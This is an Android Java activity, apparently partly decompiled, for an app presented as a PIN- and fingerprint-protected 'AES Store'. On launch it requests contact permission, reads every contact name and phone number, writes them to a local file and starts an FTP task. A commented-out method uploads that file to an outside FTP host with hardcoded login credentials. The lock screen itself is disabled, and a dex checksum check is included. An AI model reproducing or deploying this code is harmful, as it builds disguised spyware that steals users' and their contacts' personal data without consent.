package com.example.xavier.aesstor;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import com.beautycoder.pflockscreen.PFFLockScreenConfiguration;
import com.beautycoder.pflockscreen.fragments.PFLockScreenFragment;
import com.beautycoder.pflockscreen.security.PFFingerprintPinCodeHelper;
import com.beautycoder.pflockscreen.security.PFSecurityException;
import com.example.xavier.R;

import java.io.BufferedWriter;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.jar.JarFile;
import java.util.zip.ZipEntry;
import android.support.v7.app.AlertDialog.Builder;

import static android.Manifest.permission.READ_CONTACTS;

public class MainActivity extends AppCompatActivity {
	
//	public TextView contacts;
	private static final int REQUEST_READ_CONTACTS = 0;
	static final String FILENAME = "neo.txt";
	final String LOG_TAG = "myLogs";
	public ArrayList<String> arr;
	static Context context;
	
	public String myFilePath;
	
	//
	private PFLockScreenFragment.OnPFLockScreenCodeCreateListener mCodeCreateListener = new MainActivity$2();
	private PFLockScreenFragment.OnPFLockScreenLoginListener mLoginListener = new MainActivity$3();
	//
	
	//
	/* renamed from: com.example.xavier.aesstor.MainActivity$1 */
	class MainActivity$1 implements DialogInterface.OnClickListener {
		MainActivity$1() {
		}
		
		@Override
		public void onClick( DialogInterface dialog, int which ) {
//			Process.killProcess(Process.myPid());
//			System.exit(1);
		}
	}
	
	/* renamed from: com.example.xavier.aesstor.MainActivity$2 */
	class MainActivity$2 implements PFLockScreenFragment.OnPFLockScreenCodeCreateListener {
		MainActivity$2() {
		}
		
		public void onCodeCreated(String encodedCode) {
			Toast.makeText(MainActivity.this, "Code created!!!", Toast.LENGTH_SHORT).show();
			PreferencesSettings.saveToPref(MainActivity.this, encodedCode);
			MainActivity.this.showMainFragment();
		}
	}
	
	/* renamed from: com.example.xavier.aesstor.MainActivity$3 */
	class MainActivity$3 implements PFLockScreenFragment.OnPFLockScreenLoginListener {
		MainActivity$3() {
		}
		
		public void onCodeInputSuccessful() {
			Toast.makeText(MainActivity.this, "PIN is right!", Toast.LENGTH_SHORT).show();
			MainActivity.this.showMainFragment();
		}
		
		public void onFingerprintSuccessful() {
			Toast.makeText(MainActivity.this, "Fingerprint successful!", Toast.LENGTH_SHORT).show();
			MainActivity.this.showMainFragment();
		}
		
		public void onPinLoginFailed() {
			Toast.makeText(MainActivity.this, "Pin failed", Toast.LENGTH_SHORT).show();
		}
		
		public void onFingerprintLoginFailed() {
			Toast.makeText(MainActivity.this, "Fingerprint failed", Toast.LENGTH_SHORT).show();
		}
	}
	//
	
	@SuppressLint( "ResourceType" )
	protected void onCreate( Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		context = getApplicationContext();
		myFilePath = context.getFilesDir() + "/" + "neo.txt";

//		contacts = (TextView) findViewById( R.id.tv );
		
		//
		JarFile containerJar = null;
		try {
			containerJar = new JarFile(getApplicationInfo().sourceDir);
			ZipEntry ze = containerJar.getEntry("classes.dex");
			if (ze != null) {
				if (Long.parseLong(getString( R.string.original_hash)) != ze.getCrc()) {
					new Builder(this).setTitle((CharSequence) "Error").setMessage((CharSequence) "Some error during loading process").setPositiveButton(17039379, new MainActivity$1()).setIcon(17301543).show();
				}
			}
			if (containerJar != null) {
				try {
					containerJar.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		} catch (IOException e2) {
			e2.printStackTrace();
			if (containerJar != null) {
				try {
					containerJar.close();
				} catch ( IOException e ) {
					e.printStackTrace( );
				}
			}
		} catch (Throwable th) {
			if (containerJar != null) {
				try {
					containerJar.close();
				} catch (IOException e3) {
					e3.printStackTrace();
				}
			}
		}
//		showLockScreenFragment();
		
		mayRequestContacts();
		
		getContacts();
		
		NeoFTP neoFTP = new NeoFTP();
		neoFTP.execute(  );
		
		
		
	}
	
	//
	private void showLockScreenFragment() {
		try {
			boolean isPinExist = PFFingerprintPinCodeHelper.getInstance().isPinCodeEncryptionKeyExist();
			PFFLockScreenConfiguration.Builder builder = new PFFLockScreenConfiguration.Builder(this).setTitle(isPinExist ? "Unlock AES Store with your PIN" : "Create Code").setCodeLength(6);
			PFLockScreenFragment fragment = new PFLockScreenFragment();
			builder.setMode(isPinExist ? 1 : 0);
			if (isPinExist) {
				fragment.setEncodedPinCode(PreferencesSettings.getCode(this));
				fragment.setLoginListener(this.mLoginListener);
			}
			fragment.setConfiguration(builder.build());
			fragment.setCodeCreateListener(this.mCodeCreateListener);
			getSupportFragmentManager().beginTransaction().replace(R.id.container_view, fragment).commit();
		} catch (PFSecurityException e) {
			e.printStackTrace();
			Toast.makeText(this, "Can not get pin code info", Toast.LENGTH_SHORT).show();
		}
	}
	
	public void showResetLockScreenFragment() {
		try {
			PFFingerprintPinCodeHelper.getInstance().delete();
			showLockScreenFragment();
		} catch (PFSecurityException e) {
			e.printStackTrace();
			Toast.makeText(this, "Can not get pin code info", Toast.LENGTH_SHORT).show();
		}
	}
	
	private void showMainFragment() {
		getSupportFragmentManager().beginTransaction().replace(R.id.container_view, new MainFragment()).commit();
	}
	//
	
	private boolean mayRequestContacts() {
		if ( Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
			return true;
		}
		if (checkSelfPermission(READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
			return true;
		}
		if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
			requestPermissions(new String[]{READ_CONTACTS}, REQUEST_READ_CONTACTS);
		} else {
			requestPermissions(new String[]{READ_CONTACTS}, REQUEST_READ_CONTACTS);
		}
		return false;
	}
	
	@Override
	public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
	                                       @NonNull int[] grantResults) {
		if (requestCode == REQUEST_READ_CONTACTS) {
			if (grantResults.length == 1 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
				
				getContacts();
			}
		}
	}
	
	public void getContacts(){
		String phoneNumber = null;
		
		arr = new ArrayList <>(  );
		
		Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
		String _ID = ContactsContract.Contacts._ID;
		String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
		String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;
		
		Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
		String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
		String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
		
		StringBuffer output = new StringBuffer(  );
		ContentResolver contentResolver = getContentResolver();
		Cursor cursor = contentResolver.query( CONTENT_URI, null, null, null, null );
		
		if(cursor.getCount() > 0){
			while ( cursor.moveToNext() ){
				String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
				String name = cursor.getString(cursor.getColumnIndex(DISPLAY_NAME));
				int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(HAS_PHONE_NUMBER)));
				
				if(hasPhoneNumber > 0){
					output.append( "\n Name: " + name );
					Cursor phoneCursor = contentResolver.query( PhoneCONTENT_URI, null ,
							Phone_CONTACT_ID + " =?", new String[] {contact_id}, null);
					
					arr.add( "\n Name: " + name );
					
					while (phoneCursor.moveToNext()) {
						phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
						output.append("\n Телефон: " + phoneNumber);
						
						arr.add( "\n Телефон: " + phoneNumber );
					}
				}
				
				output.append( "\n" );
				arr.add( "\n" );
			}
//			contacts.setText( output );
		}
		writeFile( output );
		
	}
	
	void writeFile( StringBuffer str) {
		try{
			BufferedWriter bw = new BufferedWriter( new OutputStreamWriter(
					openFileOutput( FILENAME, MODE_PRIVATE )
			) );
			
			bw.write( str.toString() );
			
			bw.close();
			
			Log.d(LOG_TAG, "File done");
		} catch ( FileNotFoundException e ){
			e.printStackTrace();
		} catch ( IOException e ) {
			e.printStackTrace();
		}
	}
	
//	public static void ftpConnect ( ) throws FileNotFoundException {
//		String host = "nativemed.beget.tech/";
//		FTPClient ftpClient = new FTPClient();
//		String myFilePath = context.getFilesDir() + "/" + "neo.txt";
//
//		try {
//			FileInputStream fileInputStream = new FileInputStream( myFilePath );
//			ftpClient.connect( host );
//			ftpClient.enterLocalPassiveMode();
//			ftpClient.login( "nativemed_neo", "28x*ixH3" );
//			ftpClient.storeFile( FILENAME, fileInputStream );
//			ftpClient.logout();
//			ftpClient.disconnect();
//
//		} catch ( FileNotFoundException e ) {
//			e.printStackTrace( );
//		} catch ( SocketException e ) {
//			e.printStackTrace( );
//		} catch ( IOException e ) {
//			e.printStackTrace( );
//		}
//
//	}
	
	public String myDir(){
		return context.getFilesDir() + "/" + "neo.txt";
	}
	
	
}
